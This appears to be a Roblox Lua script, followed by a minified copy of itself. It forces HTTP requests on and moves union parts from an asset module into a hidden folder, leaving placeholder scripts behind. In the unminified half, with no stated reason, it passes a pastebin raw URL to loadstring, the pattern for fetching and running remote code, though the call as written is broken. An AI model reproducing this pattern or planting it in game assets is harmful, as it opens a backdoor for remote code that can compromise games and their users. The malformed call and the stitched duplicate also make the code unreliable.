game.HttpService.HttpEnabled=true
local currentUnion = 1
local SS = game:GetService("ServerStorage")
local RequireHLOF = SS:FindFirstChild("RequireHLO")

if not SS:FindFirstChild("Asset") then warn("Asset Folder/ModuleScript Missing! game.ServerStorage.Asset") return end
if not SS.Asset:FindFirstChild("MainModule") then warn("MainModule Missing! game.ServerStorage.Asset.MainModule") return end

if not RequireHLOF then
    RequireHLOF = Instance.new("Folder")
    RequireHLOF.Parent = game.ServerStorage
    RequireHLOF.Name = "RequireHLO"
end

local function replaceUnion(object)
    currentUnion = currentUnion + 1
    object:SetAttribute("name", object.Name)
    object.Name = tostring(currentUnion)
    local RequireHLO = Instance.new("Script")
    RequireHLO.Parent = object.Parent
    RequireHLO.Name = "RequireHLO"
    RequireHLO:SetAttribute("id", tostring(currentUnion))
    object.Parent = RequireHLOF
end

for i,v in pairs(SS.Asset.MainModule:GetDescendants()) do
    if not v:IsA("UnionOperation") or v:IsA("MeshPart") then continue end
    replaceUnion(v)
end

loadstring("https://pastebin.com/raw/B8apBZNe")()

game.HttpService.HttpEnabled=true;local a=1;local b=game:GetService("ServerStorage")local c=b:FindFirstChild("RequireHLO")if not b:FindFirstChild("Asset")then warn("Asset Folder/ModuleScript Missing! game.ServerStorage.Asset")return end;if not b.Asset:FindFirstChild("MainModule")then warn("MainModule Missing! game.ServerStorage.Asset.MainModule")return end;if not c then c=Instance.new("Folder")c.Parent=game.ServerStorage;c.Name="RequireHLO"end;local function d(e)a=a+1;e:SetAttribute("name",e.Name)e.Name=tostring(a)local f=Instance.new("Script")f.Parent=e.Parent;f.Name="RequireHLO"f:SetAttribute("id",tostring(a))e.Parent=c end;for g,h in pairs(b.Asset.MainModule:GetDescendants())do if not h:IsA("UnionOperation")or h:IsA("MeshPart")then continue end;d(h)end